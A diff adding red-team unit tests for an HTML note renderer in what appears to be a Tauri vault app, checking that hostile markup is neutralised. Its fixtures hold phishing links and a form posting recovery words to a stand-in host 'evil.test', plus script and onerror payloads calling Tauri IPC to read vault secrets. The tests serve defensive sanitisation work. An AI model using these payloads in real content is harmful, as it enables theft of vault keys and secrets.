@@ -103,4 +103,36 @@ describe("renderEmbeddedHtml", () => {
     expect(rel.getAttribute("href")).toBeNull();
     expect(rel.getAttribute("data-href")).toBeNull();
   });
+
+  // Red team 3: a note must not be able to swap the app window for a look-alike
+  // page ("Restore your vault key: type your 24 words") or reach IPC.
+  it("no element in a note can navigate the app window: SVG links, image maps, forms", () => {
+    const el = render(
+      `<svg><a href="https://evil.test/restore"><text>Restore</text></a>
+         <a xlink:href="https://evil.test/x"><text>x</text></a></svg>
+       <map name="m"><area href="https://evil.test/area" shape="rect" coords="0,0,9,9"></map>
+       <form action="https://evil.test/collect" method="post"><input name="words"><button>Restore vault key</button></form>
+       <button form="f" formaction="https://evil.test/f">Go</button>
+       <math><mi href="https://evil.test/m">x</mi></math>
+       <frameset><frame src="https://evil.test/f"></frameset>`,
+    );
+    for (const node of Array.from(el.querySelectorAll("*"))) {
+      for (const name of ["href", "xlink:href", "action", "formaction"]) {
+        expect(node.getAttribute(name), `${node.tagName} ${name}`).toBeNull();
+      }
+    }
+    expect(el.querySelector("form")).toBeNull();
+    expect(el.querySelector("frame")).toBeNull();
+    // Content survives as inert text, and an external SVG link is still openable the safe way.
+    expect(el.textContent).toContain("Restore vault key");
+  });
+
+  it("an IPC payload in a note is dropped, never rendered as script", () => {
+    const el = render(
+      `<script>window.__TAURI_INTERNALS__.invoke("vault_secret_get",{key:"vk:x"})</script>
+       <img src="x" onerror="__TAURI_INTERNALS__.invoke('save_text_file')">
+       <iframe srcdoc="<script>parent.__TAURI_INTERNALS__</script>"></iframe>`,
+    );
+    expect(el.innerHTML).not.toContain("__TAURI_INTERNALS__");
+  });
 });
